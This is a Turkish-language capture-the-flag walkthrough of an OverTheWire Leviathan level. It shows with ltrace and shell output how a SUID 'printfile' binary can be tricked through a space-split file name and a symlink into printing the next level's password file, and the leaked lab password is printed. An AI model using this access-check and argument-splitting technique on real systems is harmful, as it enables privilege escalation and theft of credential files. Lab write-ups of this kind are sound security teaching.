# Leviathan 3 - 2

Biraz Teori

Bu seviyede, bazı alışılmadık girişleri nasıl kullanabileceğimizi ve fonksiyon girişlerindeki farklılıkların ayrıcalık yükseltme için kullanılabileceğini göreceğiz.
Özellikle girdilerdeki beyaz alanların bazen nasıl bölünebildiğine bakıyoruz.

Bağlantı, dosyaya diğer klasörlerden erişime izin veren sembolik bir işaretçidir.
Düzenlendiğinde orijinalden farklı olacak bir kopya oluşturmak yerine, orijinali işaret eden bir bağlantı kullanılır.

Çözüm

Tekrar ana klasör içeriğine bakarak ve 'leviathan3' kullanıcısının sahibi olduğu 'printfile' adlı bir SUID ikili dosyasını bularak başlıyorum.
Bu yüzden ne yaptığını tekrar test ediyorum:

```bash
1 leviathan2@leviathan:~$ ls -la
2 total 28
3 drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
4 drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
5 -rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
6 -rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
7 -r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
8 -rw-r--r--  1 root       root        675 May 15  2017 .profile
9 leviathan2@leviathan:~$ ./printfile
10 *** File Printer ***
11 Usage: ./printfile filename
```

---

Görünüşe göre ikili dosyayı bir dosyayla kullanabiliriz ve isme göre dosyanın içeriğini yazdıracaktır.
Şimdi ‘leviathan3’ kullanıcısının şifre dosyasını yazdırmayı deneyelim.

```bash
1 leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
2 You cant have that file...
```

---

Bu o kadar da kolay görünmüyor. Görünüşe göre yalnızca iznimiz olan bir dosyayı okuyabiliyoruz.
Kontrol etmek için ana klasördeki bir dosyada test ediyorum. Beklendiği gibi çalıştığını görebiliriz:

```bash
1 leviathan2@leviathan:~$ ./printfile .bash_logout
2 # ~/.bash_logout: executed by bash(1) when login shell exits.
3
4 # when leaving the console clear the screen to increase privacy
5
6 if [ "$SHLVL" = 1 ]; then
7     [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
8 fi
```

---

Artık şu ana kadar sahip olduğumuz bilgiler bir sonraki seviyenin şifresinin nasıl alınacağını anlamak için yeterli değil.
Programı daha iyi anlamamız gerekiyor.
Önceki seviyede bir programı analiz etmek için iki komut öğrendik.
Bakalım ltrace ile neler bulabileceğimize.

```bash
1 leviathan2@leviathan:~$ ltrace ./printfile .bash_logout
2 __libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
3 access(".bash_logout", 4)                                              = 0
4 snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")  = 21
5 geteuid()                                                              = 12002
6 geteuid()                                                              = 12002
7 setreuid(12002, 12002)                                                 = 0
8 system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
9
10 # when leaving the console clear the screen to increase privacy
11
12 if [ "$SHLVL" = 1 ]; then
13     [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
14 fi
15  <no return ...>
16 --- SIGCHLD (Child exited) ---
17 <... system resumed> )                                                 = 0
18 +++ exited (status 0) +++
```

---

Öncelikle kullanıcının dosyaya erişmesine izin verilip verilmediğini kontrol eden erişim işlevi çağrılır (bu durumda kullanıcı 'leviathan2'dir).
Kullanıcı kimliğinin değiştirilmesi ancak daha sonra yapılır.
Dosyayı yazdırmak için /bin/cat'in çağrıldığını da görebiliriz.

Artık potansiyel beklenmedik girdilerin neler yapabileceğini deneyebilir ve görebiliriz.
Bakalım iki dosya girsek ne olacak:

```bash
1 leviathan2@leviathan:~$ ltrace ./printfile .bash_logout .profile
2 __libc_start_main(0x804852b, 3, 0xffffd774, 0x8048610 <unfinished ...>
3 access(".bash_logout", 4)                                              = 0
4 snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")  = 21
5 geteuid()                                                              = 12002
6 geteuid()                                                              = 12002
7 setreuid(12002, 12002)                                                 = 0
8 system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
9
10 # when leaving the console clear the screen to increase privacy
11
12 if [ "$SHLVL" = 1 ]; then
13     [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
14 fi
15  <no return ...>
16 --- SIGCHLD (Child exited) ---
17 <... system resumed> )                                                 = 0
18 +++ exited (status 0) +++
```

---

Yalnızca ilk dosya yazdırılır.

Adında boşluk olan bir dosyaya ne dersiniz? Yaptığımız şey, adında boşluk bulunan bir test dosyası oluşturmak.
Ltrace ile '/bin/cat' dosyasının yalnızca dosyanın ilk kısmına baktığını görüyoruz ('/tmp/tmp.BykcxJXZxD/test').

```bash
1 leviathan2@leviathan:~$ mktemp -d
2 /tmp/tmp.BykcxJXZxD
3 leviathan2@leviathan:~$ touch /tmp/tmp.BykcxJXZxD/"test file.txt"
4 leviathan2@leviathan:~$ ls -la /tmp/tmp.BykcxJXZxD
5 total 228
6 drwx--S---   2 leviathan2 root   4096 Jul  5 09:03 .
7 drwxrws-wt 181 root       root 225280 Jul  5 09:02 ..
8 -rw-r--r--   1 leviathan2 root      0 Jul  5 09:03 test file.txt
9 leviathan2@leviathan:~$ ltrace ./printfile /tmp/tmp.BykcxJXZxD/"test file.txt"
10 __libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
11 access("/tmp/tmp.BykcxJXZxD/test file.tx"..., 4)                       = 0
12 snprintf("/bin/cat /tmp/tmp.BykcxJXZxD/tes"..., 511, "/bin/cat %s", "/tmp/tmp.BykcxJXZxD/test file.tx"...) = 42
13 geteuid()                                                              = 12002
14 geteuid()                                                              = 12002
15 setreuid(12002, 12002)                                                 = 0
16 system("/bin/cat /tmp/tmp.BykcxJXZxD/tes".../bin/cat: /tmp/tmp.BykcxJXZxD/test: No such file or directory
17 /bin/cat: file.txt: No such file or directory
18  <no return ...>
19 --- SIGCHLD (Child exited) ---
20 <... system resumed> )                                                 = 256
21 +++ exited (status 0) +++
```

---

Böylece erişim fonksiyonu dosya adının tamamına bakar ve böylece dosyayı okumamıza olanak tanır.
Ancak '/bin/cat' dosya adının yalnızca bir kısmını, özellikle de boşluktan önceki her şeyi alır.

Artık şifre dosyasına bağlanan ‘test’ adında bir dosya oluşturabilir ve ‘leviathan3’ kullanıcısına dizine erişim izni verebiliriz.
Bu şekilde ikili şifre dosyasını çağırır ve biz kontrolden kaçtık.

```bash
1 leviathan2@leviathan:~$ clear
2 leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.BykcxJXZxD/test
3 leviathan2@leviathan:~$ ls -la /tmp/tmp.BykcxJXZxD
4 total 228
5 drwx--S---   2 leviathan2 root   4096 Jul  5 09:11 .
6 drwxrws-wt 181 root       root 225280 Jul  5 09:10 ..
7 lrwxrwxrwx   1 leviathan2 root     30 Jul  5 09:11 test -> /etc/leviathan_pass/leviathan3
8 -rw-r--r--   1 leviathan2 root      0 Jul  5 09:03 test file.txt
9 leviathan2@leviathan:~$ chmod 777 /tmp/tmp.BykcxJXZxD
10 leviathan2@leviathan:~$ ./printfile /tmp/tmp.BykcxJXZxD/"test file.txt"
11 Ahdiemoo1j
12 /bin/cat: file.txt: No such file or directory
```

---
